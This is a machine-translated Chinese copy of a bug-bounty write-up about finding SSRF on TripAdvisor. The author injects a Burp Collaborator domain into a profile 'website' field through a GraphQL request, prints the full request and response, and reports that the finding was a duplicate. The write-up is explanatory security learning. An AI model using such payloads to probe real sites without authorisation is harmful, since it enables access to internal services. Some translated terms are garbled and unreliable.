<html>
<head>
<title>Server-Side Request Forgery (SSRF)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">服务器端请求伪造(SSRF)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/server-side-request-forgery-ssrf-8e0fa290f7e6?source=collection_archive---------2-----------------------#2021-08-29">https://infosecwriteups.com/server-side-request-forgery-ssrf-8e0fa290f7e6?source=collection_archive---------2-----------------------#2021-08-29</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><div class=""><h2 id="9679" class="pw-subtitle-paragraph jq is it bd b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh dk translated">破坏访问控制(BAC)&gt;服务器端请求伪造(SSRF)</h2></div><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ki"><img src="../Images/3f8978fce729d8d2302ee9c0e20afb7d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*B6qrU46WNpBHiv0T"/></div></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">照片由<a class="ae ky" href="https://unsplash.com?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank"> Unsplash </a>上的<a class="ae ky" href="https://unsplash.com/@jabacule?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank"> Justaf Abduh </a>拍摄</figcaption></figure></div><div class="ab cl kz la hx lb" role="separator"><span class="lc bw bk ld le lf"/><span class="lc bw bk ld le lf"/><span class="lc bw bk ld le"/></div><div class="im in io ip iq"><h2 id="8571" class="lg lh it bd li lj lk dn ll lm ln dp lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated">什么是SSRF？！</h2><p id="f795" class="pw-post-body-paragraph mc md it me b mf mg ju mh mi mj jx mk lp ml mm mn lt mo mp mq lx mr ms mt mu im bi translated">服务器端请求伪造(<strong class="me iu"> SSRF </strong>)是一种利用漏洞攻击防火墙后内部系统，从外部网络无法访问。SSRF将访问内部运行的服务，如SSH、本地主机、FTP等。一个SSRF场景是强制服务器连接到组织基础设施内的内部专用服务。</p><h2 id="0625" class="lg lh it bd li lj lk dn ll lm ln dp lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated">简介:</h2><p id="b692" class="pw-post-body-paragraph mc md it me b mf mg ju mh mi mj jx mk lp ml mm mn lt mo mp mq lx mr ms mt mu im bi translated">在测试猫途鹰的漏洞和缺陷时，我发现它容易受到SSRF的攻击。我使用Burp Suite功能协作器发现了这个漏洞。<em class="mv">什么是打嗝合作者</em>？Burp Collaborator是一种网络服务，Burp Suite使用它来帮助发现多种漏洞。<strong class="me iu">例如</strong>，一些基于注入的漏洞可以使用有效载荷进行检测，当成功注入时，有效载荷会触发与外部系统的交互。</p><h2 id="6a24" class="lg lh it bd li lj lk dn ll lm ln dp lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated"><strong class="ak">我是这样做的:</strong></h2><ol class=""><li id="0e73" class="mw mx it me b mf mg mi mj lp my lt mz lx na mu nb nc nd ne bi translated">打开“打嗝套件”&gt;“打嗝菜单”&gt;“打嗝合作者客户端”,然后选择“打嗝合作者客户端”</li><li id="c8a0" class="mw mx it me b mf nf mi ng lp nh lt ni lx nj mu nb nc nd ne bi translated">单击显示“复制到剪贴板”的位置，这将复制利用web应用程序所需的有效负载，例如:` jhggfwo 94 Wu 094 CTR trstwrvterwt 0 tvwg . burpcollaborator . net '</li></ol><p id="de4b" class="pw-post-body-paragraph mc md it me b mf nk ju mh mi nl jx mk lp nm mm mn lt nn mp mq lx no ms mt mu im bi translated">3.将Collaborator客户端有效负载粘贴到网站字段，如下所示，并转发请求。</p><p id="4bcf" class="pw-post-body-paragraph mc md it me b mf nk ju mh mi nl jx mk lp nm mm mn lt nn mp mq lx no ms mt mu im bi translated">4.使用“立即轮询”功能检索有效负载产生的任何网络交互的详细信息。</p><p id="1902" class="pw-post-body-paragraph mc md it me b mf nk ju mh mi nl jx mk lp nm mm mn lt nn mp mq lx no ms mt mu im bi translated">5.等待奇迹发生。</p></div><div class="ab cl kz la hx lb" role="separator"><span class="lc bw bk ld le lf"/><span class="lc bw bk ld le lf"/><span class="lc bw bk ld le"/></div><div class="im in io ip iq"><h2 id="93b1" class="lg lh it bd li lj lk dn ll lm ln dp lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated">Http请求:</h2><pre class="kj kk kl km gt np nq nr ns aw nt bi"><span id="f3d2" class="lg lh it nq b gy nu nv l nw nx">POST /data/graphql/batched HTTP/1.1<br/>Host: www.tripadvisor.com<br/>User-Agent: Mozilla/5.0 <br/>Accept: */*<br/>Accept-Language: en-US,en;q=0.5<br/>Accept-Encoding: gzip, deflate<br/>content-type: application/json<br/>Origin: https://www.tripadvisor.com<br/>Content-Length: 1520<br/>Connection: close</span><span id="0d97" class="lg lh it nq b gy ny nv l nw nx">[{"operationName":"EditProfile","variables":{"userId":"9A9A11C7013E070C233A82C19CC97D78","displayName":null,"username":null,"bio":null,"hometown":null,"website":"<strong class="nq iu">e3i57wj14co4lyphm5kwqx8xjoped3.burpcollaborator.net</strong>","acceptedToU":true}]</span></pre><h2 id="431f" class="lg lh it bd li lj lk dn ll lm ln dp lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated">Http响应:</h2><pre class="kj kk kl km gt np nq nr ns aw nt bi"><span id="1e80" class="lg lh it nq b gy nu nv l nw nx">RESPONSE<br/>HTTP/1.1 200 OK<br/>Server: Apache<br/>Pragma: no-cache<br/>P3P: CP="NOI CURa ADMa DEVa TAIa OUR BUS IND UNI COM NAV INT DSP COR CAO PSA IDC ADM DEVi TAIi PSD IVAi IVDi CONi HIS CNT"<br/>Cache-Control: no-cache, no-store, must-revalidate<br/>Timing-Allow-Origin: https://www.tripadvisor.com<br/>Vary: Accept-Encoding<br/>Content-Length: 2089<br/>Content-Type: application/json<br/>Date: Mon, 21 Sep 2020 17:54:47 GMT<br/>Connection: close<br/><br/><br/>[{"data":{"updateMemberProfile":{"statuses":["OK"],"memberProfile":{"userId":"9A9A11C70C97D78","avatar":{"id":********,"photoSizes":[{"url":"https://dynamic-media-cdn.tripadvisor.com/media/photo-o/1a/f6/e7/99/default-avatar-2020-57.jpg?w=100&amp;h=100&amp;s=1","width":0,"height":0,"__typename":"PhotoSize"},{"url":"https://media-cdn.tripadvisor.com/media/photo-t/99/default-avatar-2021-75.jpg"}]</span></pre><h2 id="3a69" class="lg lh it bd li lj lk dn ll lm ln dp lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated">合作者回应:</h2><figure class="kj kk kl km gt kn gh gi paragraph-image"><div class="gh gi nz"><img src="../Images/c209aba4a4738e599526c68dde8d15f7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1200/1*AAPsVwHyCoYI5aLwsRDasw.gif"/></div></figure></div><div class="ab cl kz la hx lb" role="separator"><span class="lc bw bk ld le lf"/><span class="lc bw bk ld le lf"/><span class="lc bw bk ld le"/></div><div class="im in io ip iq"><h2 id="1f63" class="lg lh it bd li lj lk dn ll lm ln dp lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated">该报告:</h2><p id="d2b4" class="pw-post-body-paragraph mc md it me b mf mg ju mh mi mj jx mk lp ml mm mn lt mo mp mq lx mr ms mt mu im bi translated">本文有趣的部分来了。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi oa"><img src="../Images/c554cad91ffd3cfa809812366d06fe0a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iNMjFTRlceSJY9VYQlmqbw.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="ko kp di kq bf kr"><div class="gh gi ob"><img src="../Images/f9a76fe3832a56c91a5af790eaca0ad8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*trJdNLolmMCGGdDcNfcTJw.png"/></div></div></figure><p id="edd4" class="pw-post-body-paragraph mc md it me b mf nk ju mh mi nl jx mk lp nm mm mn lt nn mp mq lx no ms mt mu im bi translated">我一看到那些日志，就告诉自己“是的，我发财了！”。呃，不太好。通过阅读他们的反应，你可以知道我高兴得太早了。几年前有人送来了同样的报告。他们的反应让我措手不及，因为这不是一个容易的发现。只有仔细检查web应用程序的每一个响应/请求，以便找到一个字段来添加您的有效负载并希望得到响应，才有可能利用该漏洞。</p></div><div class="ab cl kz la hx lb" role="separator"><span class="lc bw bk ld le lf"/><span class="lc bw bk ld le lf"/><span class="lc bw bk ld le"/></div><div class="im in io ip iq"><h2 id="695a" class="lg lh it bd li lj lk dn ll lm ln dp lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated">奖励:</h2><figure class="kj kk kl km gt kn gh gi paragraph-image"><div class="gh gi oc"><img src="../Images/0314e2ae42bfc48ae13a4abd975abf79.png" data-original-src="https://miro.medium.com/v2/resize:fit:838/format:webp/1*ERo9ChJM7PJp01tvCD3zSA.png"/></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">报酬</figcaption></figure><p id="318d" class="pw-post-body-paragraph mc md it me b mf nk ju mh mi nl jx mk lp nm mm mn lt nn mp mq lx no ms mt mu im bi translated">看上面的照片，你可以看到这个报告的结果。老实说，得到<strong class="me iu"> <em class="mv"> 1 </em>点</strong>作为“奖励”并不是我发这份报告的初衷。但是有总比没有好，不是吗？！</p><h2 id="731f" class="lg lh it bd li lj lk dn ll lm ln dp lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated"><strong class="ak">总结</strong></h2><p id="effe" class="pw-post-body-paragraph mc md it me b mf mg ju mh mi mj jx mk lp ml mm mn lt mo mp mq lx mr ms mt mu im bi translated">虽然我的工作没有得到任何奖励，但从中得到了一些好的东西，经验。现在，我知道了要利用哪些端点，以及利用哪些端点或利用哪些端点。永远不要让这种结果让你气馁。重复的意思是你做了有价值的事情，你只是在别人之后做了，但是你做了。</p></div></div>    
</body>
</html>